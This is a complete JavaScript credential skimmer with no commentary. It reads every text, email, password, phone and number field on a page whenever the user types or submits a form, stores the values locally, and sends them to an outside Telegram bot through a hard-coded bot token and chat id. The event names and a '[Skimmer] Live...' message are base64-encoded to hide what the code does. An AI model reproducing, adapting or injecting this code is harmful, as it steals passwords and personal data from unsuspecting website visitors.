(function () {
    const _ = atob;
    const token = "7805822636:AAFo5FBSIIzkpP0GsPBjOWVM5vVEz_g2z3s";
    const chatId = "7869970772";

    function sendTelegram(data) {
        const msg = encodeURIComponent(JSON.stringify(data));
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${msg}`;

        fetch(url).catch(() => {});
    }

    function logLocal(data) {
        let logs = JSON.parse(localStorage.getItem("formLogs") || "[]");
        logs.push({ ...data, time: new Date().toISOString() });
        localStorage.setItem("formLogs", JSON.stringify(logs));
    }

    function ghostSkim() {
        let data = {};
        document.querySelectorAll("input").forEach(i => {
            if (i.type.match(/(text|email|password|tel|number)/i) && i.value) {
                data[i.name || i.id || i.type] = i.value;
            }
        });
        if (Object.keys(data).length > 0) {
            logLocal(data);
            sendTelegram(data);
        }
    }

    // Obfuscated function triggers
    document.addEventListener(_("c3VibWl0"), ghostSkim);  // "submit"
    document.addEventListener(_("aW5wdXQ="), ghostSkim);  // "input"

    console.log(_("W1NraW1tZXJdIExpdmUuLi4="));  // "[Skimmer] Live..."
})();
